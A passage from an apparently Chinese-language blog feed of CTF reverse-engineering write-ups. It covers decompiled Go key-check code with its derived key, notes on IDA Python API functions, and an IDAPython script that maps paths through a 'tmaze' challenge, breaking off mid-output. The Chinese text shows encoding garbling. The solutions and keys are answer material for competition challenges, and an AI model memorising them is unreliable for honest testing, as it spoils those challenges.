<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Friday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> r; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sr; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> srs1; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f_i_j; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">int</span> rr; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// r10</span></span><br><span class="line">  internal_abi_Type_0 *v21; <span class="comment">// [rsp+18h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v22; <span class="comment">// [rsp+20h] [rbp-C0h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+28h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+30h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> f0t5[<span class="number">2</span>]; <span class="comment">// [rsp+38h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+48h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> f0t5_[<span class="number">9</span>]; <span class="comment">// [rsp+50h] [rbp-90h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+98h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+C0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+C8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> keya; <span class="comment">// [rsp+E8h] [rbp+8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> key_8; <span class="comment">// [rsp+F0h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;v28 &lt;= *(v5 + <span class="number">16LL</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  key_8 = v4;</span><br><span class="line">  keya = v2;</span><br><span class="line">  f0t5[<span class="number">1LL</span>] = v3;</span><br><span class="line">  qmemcpy(&amp;v24 + <span class="number">2LL</span>, <span class="string">&quot;UNL0CK&quot;</span>, <span class="number">6LL</span>);</span><br><span class="line">  v6 = sub_45E299(&amp;v21);</span><br><span class="line">  count = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; <span class="number">6LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    f0t5[<span class="number">0LL</span>] = count;</span><br><span class="line">    v24 = runtime_makeslice(v21, v22, v23);</span><br><span class="line">    v8 = f0t5[<span class="number">0LL</span>];</span><br><span class="line">    v9 = <span class="number">3LL</span> * f0t5[<span class="number">0LL</span>];</span><br><span class="line">    f0t5_[v9] = <span class="number">7LL</span>;</span><br><span class="line">    f0t5_[v9 + <span class="number">1LL</span>] = <span class="number">7LL</span>;</span><br><span class="line">    f0t5_[v9 - <span class="number">1LL</span>] = v10;</span><br><span class="line">    count = v8 + <span class="number">1LL</span>;</span><br><span class="line">    v6 = keya;</span><br><span class="line">    v4 = key_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">6LL</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !f0t5_[<span class="number">3LL</span> * i] )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *f0t5_[<span class="number">3LL</span> * i - <span class="number">1LL</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">7LL</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= f0t5_[<span class="number">0LL</span>] )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(v26 + <span class="number">8LL</span> * j) = j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( r = <span class="number">1LL</span>; r &lt; <span class="number">6LL</span>; ++r )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( sr = <span class="number">1LL</span>; sr &lt; <span class="number">7LL</span>; ++sr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= r - <span class="number">1LL</span> )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      srs1 = sr - <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v24 + sr + <span class="number">1LL</span>) == *(r + v6 - <span class="number">1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( f0t5[<span class="number">3LL</span> * r] &lt;= srs1 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= f0t5_[<span class="number">3LL</span> * r] )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        *(f0t5_[<span class="number">3LL</span> * r - <span class="number">1LL</span>] + <span class="number">8LL</span> * sr) = *((f0t5[<span class="number">3LL</span> * r - <span class="number">1LL</span>] + <span class="number">8LL</span> * sr) - <span class="number">8LL</span>);<span class="comment">// å¦‚æœ enc[sr - 1] == input[r - 1]</span></span><br><span class="line">                                                <span class="comment">// f0t5[r][sr] = f0t5[r][sr-1]</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v16 = f0t5[<span class="number">3LL</span> * r - <span class="number">1LL</span>];</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= f0t5[<span class="number">3LL</span> * r] )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v17 = f0t5_[<span class="number">3LL</span> * r];</span><br><span class="line">        f_i_j = *(v16 + <span class="number">8LL</span> * sr);</span><br><span class="line">        rr = f0t5_[<span class="number">3LL</span> * r - <span class="number">1LL</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v17 &lt;= srs1 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v20 = *(v16 + <span class="number">8LL</span> * sr - <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *(rr + <span class="number">8LL</span> * sr - <span class="number">8LL</span>) &lt; f_i_j )   <span class="comment">// f0t5[r][sr-1] &lt; f0t5[r][sr]</span></span><br><span class="line">          f_i_j = *(rr + <span class="number">8LL</span> * sr - <span class="number">8LL</span>);       <span class="comment">// min = f0t5[s][sr-1]</span></span><br><span class="line">        <span class="keyword">if</span> ( v20 &lt; f_i_j )</span><br><span class="line">          f_i_j = v20;</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= v17 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        *(rr + <span class="number">8LL</span> * sr) = f_i_j + <span class="number">1LL</span>;         <span class="comment">// f0t5[r][sr] = min + 1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v30 &lt;= <span class="number">6LL</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  BYTE1(v24) = *(v29 + <span class="number">48LL</span>) == <span class="number">3LL</span>;            <span class="comment">// f0t5[5][6] == 3</span></span><br><span class="line">  runtime_chansend1(v21, v22);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆå§‹åŒ–ä¸€ä¸ª6 * 7çš„çŸ©é˜µ ç¬¬0åˆ—çš„å€¼åˆå§‹åŒ–ä¸º0-7 ç¬¬1è¡Œåˆå§‹åŒ–ä¸º0-5 ç„¶åè¦æ±‚å¤„ç†å®Œåmatrix[5][6]çš„å€¼æ˜¯3 å¯ä»¥ç›´æ¥æ‹¼å‡ºkeyæ¥<code>KNLCC</code></p>
<p>è¦åŠ¨è°ƒç±»ä¼¼çš„ä¸å¯¹åŒä¸€ä¸ªæ•°æ®æ“ä½œæ‰€ä»¥å¤šçº¿ç¨‹å¹¶è¡Œçš„ç¨‹åº éœ€è¦åœ¨æ¯ä¸ªçº¿ç¨‹å‡½æ•°çš„å…¥å£ä¸‹æ–­ç‚¹ ç„¶ååœ¨åŠ¨è°ƒæ—¶åˆ‡æ¢åˆ°é™¤ä¸»å‡½æ•°ä»¥å¤–çš„çº¿ç¨‹å‡½æ•°çš„ç•Œé¢ å‘ç°åœ¨ç­‰å¾…è¿è¡Œçš„çº¿ç¨‹é”å†… è¿›è¡Œæ­¥å‡ºä¼šåˆ°è¾¾æŸä¸ªå‡½æ•°çš„å…¥å£æ–­ç‚¹ è¿™æ—¶å€™å¯¹é™¤äº†ä¸»çº¿ç¨‹ä»¥å¤–çš„çº¿ç¨‹æš‚åœ å¦åˆ™å¯èƒ½ä¼šå› ä¸ºå…¶ä»–çº¿ç¨‹å…ˆå¤„ç†å®Œæ•°æ®è€Œç¨‹åºå› ä¸ºå‘é€åˆ°ä¿¡é“çš„ä¿¡å·ç›´æ¥é€€å‡º</p>
<h2 id="patchflag-Windowså†…æ ¸é€†å‘"><a href="#patchflag-Windowså†…æ ¸é€†å‘" class="headerlink" title="patchflag | Windowså†…æ ¸é€†å‘"></a>patchflag | Windowså†…æ ¸é€†å‘</h2><p><a href="https://1k0ct.github.io/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/#%E6%89%93%E8%A1%A5%E4%B8%81">Msdelta.dllç ”ç©¶</a></p>
<p>å‰©ä¸‹çš„é¢˜ç›®å¾…å¤ç°â€¦</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAapiå­¦ä¹ </title>
    <url>/2024/09/05/IDAapi%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>Angrçš„åŠ›é‡æ˜¯æœ‰æé™çš„ æ‰€ä»¥æˆ‘è¦è½¬è¡Œå­¦idaapiäº†!</p>
<span id="more"></span>

<h2 id="è·å–äºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–äºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–äºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯"></a>è·å–äºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯</h2><h3 id="è·å–ç¡¬ä»¶ä¿¡æ¯"><a href="#è·å–ç¡¬ä»¶ä¿¡æ¯" class="headerlink" title="è·å–ç¡¬ä»¶ä¿¡æ¯"></a>è·å–ç¡¬ä»¶ä¿¡æ¯</h3><h4 id="inf-is-64bit-bool-inf-is-32bit-exactly-bool"><a href="#inf-is-64bit-bool-inf-is-32bit-exactly-bool" class="headerlink" title="inf_is_64bit() -&gt; bool | inf_is_32bit_exactly() -&gt; bool"></a>inf_is_64bit() -&gt; bool | inf_is_32bit_exactly() -&gt; bool</h4><p>åˆ¤æ–­å½“å‰IDAæ‰“å¼€çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯64ä½æˆ–32ä½çš„</p>
<h4 id="inf-is-be-bool"><a href="#inf-is-be-bool" class="headerlink" title="inf_is_be() -&gt; bool"></a>inf_is_be() -&gt; bool</h4><p>åˆ¤æ–­å½“å‰ç¨‹åºçš„æ¨¡å¼æ˜¯å¤§ç«¯åº(è¿”å› True)æˆ–æ˜¯å°ç«¯åº</p>
<h4 id="inf-get-procname-lower-str"><a href="#inf-get-procname-lower-str" class="headerlink" title="inf_get_procname()[.lower()] -&gt; str"></a>inf_get_procname()[.lower()] -&gt; str</h4><p>è¿”å›ç¨‹åºæ¡†æ¶å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     == <span class="string">&#x27;metapc&#x27;</span>            : <span class="string">&#x27;ARCH_X86&#x27;</span>,</span><br><span class="line">    .startswith(<span class="string">&#x27;arm&#x27;</span>)        : [<span class="string">&#x27;ARCH_ARM64&#x27;</span>, <span class="string">&#x27;ARCH_ARM&#x27;</span>],</span><br><span class="line">    .startswith(<span class="string">&#x27;sparc&#x27;</span>)    : <span class="string">&#x27;ARCH_SPARC&#x27;</span>,</span><br><span class="line">    .startswith(<span class="string">&#x27;ppc&#x27;</span>)        : <span class="string">&#x27;ARCH_PPC&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;mips&#x27;</span>)        : <span class="string">&#x27;ARCH_MIPS&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;systemz&#x27;</span>)    : <span class="string">&#x27;ARCH_SYSTEMZ&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;s390x&#x27;</span>)    : <span class="string">&#x27;ARCH_SYSTEMZ&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="idc-get-sreg-ea-reg-int"><a href="#idc-get-sreg-ea-reg-int" class="headerlink" title="idc.get_sreg(ea, reg) -&gt; int"></a>idc.get_sreg(ea, reg) -&gt; int</h4><p>Thumbæ¨¡å¼ä¸‹åœ¨ç”¨æˆ·ä»£ç æ®µå¤„çš„ç¬¬20ä¸ªæ®µå¯„å­˜å™¨å­˜æ”¾çš„å€¼æ˜¯ 1 é€šè¿‡è¿™ä¸ªå¯ä»¥åˆ¤æ–­å½“å‰ARMæ¡†æ¶ä¸‹çš„æ¨¡å¼æ˜¯å¦æ˜¯Thumbæ¨¡å¼:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_thumb</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">return</span> idc.get_sreg(address, <span class="string">&#x27;T&#x27;</span>) == <span class="number">1</span></span><br><span class="line"><span class="comment"># idcä¸­è·å–å¯„å­˜å™¨å¯ä»¥ä½¿ç”¨å­—æ¯ä»£è¡¨ è¿™é‡Œå°†&#x27;A&#x27;è½¬åŒ–ä¸º0 åˆ™&#x27;T&#x27;è½¬åŒ–ä¸º20</span></span><br><span class="line"><span class="comment"># &lt;=&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_thumb</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">return</span> idaapi.get_sreg(address, <span class="number">20</span>) == <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="è·å–å†…å­˜ä¿¡æ¯"><a href="#è·å–å†…å­˜ä¿¡æ¯" class="headerlink" title="è·å–å†…å­˜ä¿¡æ¯"></a>è·å–å†…å­˜ä¿¡æ¯</h3><h4 id="is-mapped-ea-bool"><a href="#is-mapped-ea-bool" class="headerlink" title="is_mapped(ea) -&gt; bool"></a>is_mapped(ea) -&gt; bool</h4><p>åˆ¤æ–­åœ°å€eaæ˜¯å¦æ˜¯æœ‰æ•ˆåœ°å€(åœ¨ç¨‹åºå†…)</p>
<h4 id="get-bytes-ea-size-gmb-flags-0x01-bytes-get-wide-byte-ea-int"><a href="#get-bytes-ea-size-gmb-flags-0x01-bytes-get-wide-byte-ea-int" class="headerlink" title="get_bytes(ea, size[, gmb_flags&#x3D;0x01]) -&gt; bytes | get_wide_byte(ea) -&gt; int"></a>get_bytes(ea, size[, gmb_flags&#x3D;0x01]) -&gt; bytes | get_wide_byte(ea) -&gt; int</h4><p>åˆ†åˆ«ç”¨æ¥ä»¥å¤§ç«¯åºè·å–ä½äºåœ°å€eaå¤„çš„sizeä¸ªå­—èŠ‚æ•°æ®å’Œ1ä¸ªå­—èŠ‚çš„æ•°æ® é™¤æ­¤ä¹‹å¤–è¿˜æœ‰åŒ…æ‹¬è·å–1å­— åŒå­—ç­‰çš„å‡½æ•° ä½†æ˜¯è¿™ä¸¤ä¸ªåº”è¯¥å¤Ÿç”¨äº†</p>
<h5 id="2024-é•¿åŸæ¯-tmaze"><a href="#2024-é•¿åŸæ¯-tmaze" class="headerlink" title="[2024 é•¿åŸæ¯] tmaze"></a>[2024 é•¿åŸæ¯] tmaze</h5><p>ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *in; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// al</span></span><br><span class="line">  __int64 *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> step; <span class="comment">// ebx</span></span><br><span class="line">  __int64 *<span class="built_in">map</span>; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">size_t</span> _step; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> now; <span class="comment">// edx</span></span><br><span class="line">  __int64 v19; <span class="comment">// r14</span></span><br><span class="line"></span><br><span class="line">  in = argv[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v6 = v5++;</span><br><span class="line">  <span class="keyword">while</span> ( in[v6] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">43</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = sub_7FF6C8B81230(&amp;unk_7FF6C8BB7000, dword_7FF6C8BB7FA0);</span><br><span class="line">    mapz = v7;</span><br><span class="line">    v8 = <span class="number">6</span>;</span><br><span class="line">    v9 = v7;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = **(v9 + <span class="number">16</span>);</span><br><span class="line">      --v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 );</span><br><span class="line">    mapx = v9;</span><br><span class="line">    v10 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = **(v7 + <span class="number">16</span>);</span><br><span class="line">      --v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 );</span><br><span class="line">    v11 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(v7 + <span class="number">8</span>);</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">    mapy = v7;</span><br><span class="line">    <span class="keyword">if</span> ( argc != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = *in == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *in )</span><br><span class="line">      &#123;</span><br><span class="line">        step = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">map</span> = mapx;</span><br><span class="line">        _step = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          now = in[_step];</span><br><span class="line">          <span class="keyword">switch</span> ( now )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">              v19 = <span class="built_in">map</span>[<span class="number">2</span>];</span><br><span class="line">              <span class="keyword">if</span> ( !v19 || *(<span class="built_in">map</span> + <span class="number">26</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">              v19 = <span class="built_in">map</span>[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( !v19 || *(<span class="built_in">map</span> + <span class="number">25</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">              v19 = *<span class="built_in">map</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !*<span class="built_in">map</span> || *(<span class="built_in">map</span> + <span class="number">24</span>) )</span><br><span class="line">                <span class="keyword">goto</span> check;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">goto</span> check;</span><br><span class="line">          &#125;</span><br><span class="line">          mapx = v19;</span><br><span class="line">          *(v19 + <span class="number">27</span>) = <span class="number">1</span>;</span><br><span class="line">          _step = step;</span><br><span class="line">          len = <span class="built_in">strlen</span>(in);</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="built_in">map</span> = v19;</span><br><span class="line">          v12 = len &lt;= _step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !v12 );</span><br><span class="line">      &#125;</span><br><span class="line">check:</span><br><span class="line">      <span class="keyword">if</span> ( v12 &amp;&amp; mapx == v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = sub_7FF6C8B81770(&amp;qword_7FF6C8BB92C0, <span class="string">&quot;yes flag is flag&#123;UUID(md5(your input))&#125;&quot;</span>);</span><br><span class="line">        sub_7FF6C8B81B70(v13);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰é¢çš„é€»è¾‘ä¸è§£é‡Š æ€»ä¹‹å°±æ˜¯é€‰æ‹©x, y, zæ¥é€‰æ‹©è¦èµ°åˆ†æ”¯ ç„¶åæ ¹æ®è¿™ä¸ªä½ç½®æœ‰æ²¡æœ‰èƒ½è§£å¼•ç”¨çš„åœ°å€ æœ€ç»ˆç›®æ ‡æ˜¯è®©<code>mapx</code>åˆ°è¾¾<code>mapy</code> æ¯æ¡åˆ†æ”¯é™¤äº†è¦çœ‹èƒ½ä¸èƒ½è§£å¼•ç”¨è¿˜è¦çœ‹æ¥ä¸‹æ¥çš„ä¸‰ä¸ªå­—èŠ‚ ä¸º0ä»£è¡¨å¯¹é¥®çš„åˆ†æ”¯å¯èµ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F08%2F20240908-201731.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F08%2F20240908-202100.png" alt="image-20240908202100528"></p>
<p>è¿™æ„å‘³ç€è¿™é¢˜å¦‚æœæ‰‹åŠ¨æ‰¾è§£çš„è¯è¦ä¸åœçš„telescopeæ¥æ‰‹ç»˜åœ°å›¾ è¿™é‡Œå°±å¯ä»¥ç”¨åˆ°<code>get_bytes()</code>å’Œ<code>get_wide_byte()</code>æ¥è½»æ¾è·å–å…¨éƒ¨è·¯å¾„:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"></span><br><span class="line">starts = [<span class="number">0x1A9F16BD830</span>]</span><br><span class="line">way = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> starts:</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> start <span class="keyword">in</span> starts:</span><br><span class="line">        to_add = []</span><br><span class="line">        x = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        y = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start+<span class="number">8</span>, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        z = <span class="built_in">int</span>.from_bytes(idaapi.get_bytes(start+<span class="number">16</span>, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        to_go = [x, y, z]</span><br><span class="line">        is_x = idaapi.get_wide_byte(start + <span class="number">24</span>) ^ <span class="number">1</span></span><br><span class="line">        is_y = idaapi.get_wide_byte(start + <span class="number">25</span>) ^ <span class="number">1</span></span><br><span class="line">        is_z = idaapi.get_wide_byte(start + <span class="number">26</span>) ^ <span class="number">1</span></span><br><span class="line">        can_go = [is_x, is_y, is_z]</span><br><span class="line">        to_add = [to_go[i] * can_go[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(start) + <span class="string">&#x27;-&gt;&#x27;</span> + <span class="built_in">str</span>([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> to_add]))</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> way:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> to_add[i] <span class="keyword">and</span> to_add[i] <span class="keyword">in</span> way[path] <span class="keyword">or</span> to_add[i] == path:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Deleting <span class="subst">&#123;<span class="built_in">hex</span>(to_add[i])&#125;</span> for it in <span class="subst">&#123;[<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> way[path]]&#125;</span>&#x27;</span>)</span><br><span class="line">                    to_add[i] = <span class="number">0</span></span><br><span class="line">        way[start] = to_add</span><br><span class="line">        <span class="built_in">next</span> += [x <span class="keyword">for</span> x <span class="keyword">in</span> to_add <span class="keyword">if</span> x]</span><br><span class="line">    starts = <span class="built_in">next</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;XXXX&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> way:</span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(path)&#125;</span> -&gt; <span class="subst">&#123;[<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> way[path]]&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°result:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1a9f16bd830 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd880&#x27;, &#x27;0x1a9f16bdc90&#x27;]</span><br><span class="line">0x1a9f16bd880 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd8d0&#x27;, &#x27;0x1a9f16bd4c0&#x27;]</span><br><span class="line">0x1a9f16bdc90 -&gt; [&#x27;0x1a9f16bdc40&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd8d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdd30&#x27;]</span><br><span class="line">0x1a9f16bd4c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd510&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdc40 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be140&#x27;]</span><br><span class="line">0x1a9f16bdd30 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdd80&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd510 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd560&#x27;, &#x27;0x1a9f16bd1f0&#x27;]</span><br><span class="line">0x1a9f16be140 -&gt; [&#x27;0x1a9f16be0f0&#x27;, 